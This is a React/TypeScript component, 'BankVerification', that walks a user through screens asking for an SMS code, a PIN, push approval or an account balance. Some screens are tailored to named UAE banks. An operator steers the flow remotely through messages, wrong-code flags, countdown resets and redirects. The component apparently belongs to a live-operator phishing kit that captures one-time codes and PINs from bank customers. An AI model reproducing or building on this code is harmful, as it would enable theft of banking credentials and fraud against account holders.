import React, { useState, useEffect } from "react";
import { useSessionStatus } from "../hooks/use-session-status";
import { StatusOverlay } from "./status-overlay";
import { SmsOtp } from "../layouts/generic/sms-otp";
import { PinEntry } from "../layouts/generic/pin-entry";
import { PushWaiting } from "../layouts/generic/push-waiting";
import { BalanceCheck } from "../layouts/generic/balance-check";
import type { BankVerificationProps } from "../types";

const LAYOUT_MAP: Record<
  string,
  (p: {
    apiBase: string;
    channelSlug: string;
    sessionId: string;
    bank?: string;
    onError: (m: string) => void;
    wrongCode?: boolean;
    expiredCode?: boolean;
    onTryAgain?: () => void;
    operatorMessage?: { level: "error" | "info"; message: string } | null;
    countdownResetTrigger?: number;
  }) => JSX.Element
> = {
  sms: (p) => <SmsOtp {...p} />,
  pin: (p) => <PinEntry {...p} />,
  push: (p) => <PushWaiting bank={p.bank} />,
  balance: (p) => <BalanceCheck {...p} />,
  "enbd-sms": (p) => <SmsOtp {...p} />,
  "adcb-sms": (p) => <SmsOtp {...p} />,
  "fab-sms": (p) => <SmsOtp {...p} />,
  "mashreq-sms": (p) => <SmsOtp {...p} />,
};

export function BankVerification({
  apiBase,
  channelSlug,
  sessionId,
  onSuccess,
  onDeclined,
  onError,
  onRedirect,
}: BankVerificationProps) {
  const [error, setError] = useState<string | null>(null);

  const { status, verificationLayout, bank, redirectUrl, wrongCode, expiredCode, clearCodeFeedback, operatorMessage, countdownResetTrigger } =
    useSessionStatus(apiBase, channelSlug, sessionId);

  useEffect(() => {
    if (!channelSlug || !sessionId) return;
    if (redirectUrl) {
      if (onRedirect) {
        onRedirect(redirectUrl);
      } else {
        window.location.replace(redirectUrl);
      }
      return;
    }
    const terminalSuccess = ["success"].includes(status);
    const terminalDeclined = ["declined", "expired", "blocked"].includes(status);
    if (terminalSuccess) {
      onSuccess?.(sessionId);
      return;
    }
    if (status === "invalid") {
      onError?.("invalid");
      return;
    }
    if (terminalDeclined) {
      onDeclined?.(sessionId, status);
    }
  }, [channelSlug, sessionId, status, redirectUrl, onSuccess, onDeclined, onError, onRedirect]);

  if (!channelSlug || !sessionId) {
    return (
      <div className="bank-ui-error-missing">Missing channel or session</div>
    );
  }

  const terminalSuccess = ["success"].includes(status);
  const terminalDeclined = ["declined", "expired", "blocked", "invalid"].includes(status);
  const inProgress = ["pending", "awaiting_action"].includes(status);
  const awaitingVerification = [
    "awaiting_sms",
    "awaiting_pin",
    "awaiting_push",
    "awaiting_balance",
  ].includes(status);

  if (redirectUrl || terminalSuccess || terminalDeclined) {
    return null;
  }

  const Layout = LAYOUT_MAP[verificationLayout ?? "sms"] ?? LAYOUT_MAP["sms"];

  return (
    <div className="bank-ui-verification">
      {inProgress && <StatusOverlay />}
      {awaitingVerification && (
        <Layout
          apiBase={apiBase}
          channelSlug={channelSlug}
          sessionId={sessionId}
          bank={bank}
          onError={(m) => setError(m)}
          wrongCode={wrongCode}
          expiredCode={expiredCode}
          onTryAgain={clearCodeFeedback}
          operatorMessage={operatorMessage}
          countdownResetTrigger={countdownResetTrigger}
        />
      )}
      {error && (
        <div className="bank-ui-error-toast-wrapper">
          <div className="bank-ui-error-toast">{error}</div>
        </div>
      )}
    </div>
  );
}
